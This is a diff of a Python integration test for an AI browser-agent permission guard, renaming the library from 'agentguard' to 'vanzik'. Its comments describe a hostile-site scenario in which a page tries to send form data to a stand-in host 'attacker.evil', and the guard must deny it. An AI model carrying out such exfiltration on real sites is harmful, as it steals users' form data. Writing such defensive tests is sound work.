@@ -4,7 +4,7 @@ A14's existing ``test_real_browseruse.py`` covers the surface — navigation
 flow, form fill routing through the data scope, redaction, evaluate
 gating, deny-on-goto. The contribution of this file is a **hostile-site
 scenario**: a real page tries to exfiltrate form data to a denied
-domain, and AgentGuard must (a) gate every relevant operation and (b)
+domain, and Vanzik must (a) gate every relevant operation and (b)
 surface the deny back through the agent SDK as a ``PermissionError``.
 
 Closes the v0.5 plan AT brief item: "an end-to-end 'hostile site'
@@ -24,8 +24,8 @@ browser_use = pytest.importorskip("browser_use")  # floor enforced by pyproject 
 playwright = pytest.importorskip("playwright")
 playwright_async_api = pytest.importorskip("playwright.async_api")
 
-from agentguard import Guard  # noqa: E402
-from agentguard.adapters.browseruse import GuardedPage  # noqa: E402
+from vanzik import Guard  # noqa: E402
+from vanzik.adapters.browseruse import GuardedPage  # noqa: E402
 
 from .conftest import allow, deny  # noqa: E402
 
@@ -38,7 +38,7 @@ pytestmark = [pytest.mark.integration, pytest.mark.playwright]
 # inside Playwright — that would require a real DNS lookup. Instead the
 # test scenario is: the agent fills the form, then the agent (driven by
 # external code) calls evaluate(...) which tries to fetch attacker.evil.
-# AgentGuard sees the evaluate call and the scope is browser; the test's
+# Vanzik sees the evaluate call and the scope is browser; the test's
 # mock returns DENY for this specific URL pattern, exercising the
 # end-to-end refusal path.
 _HOSTILE_HTML = (
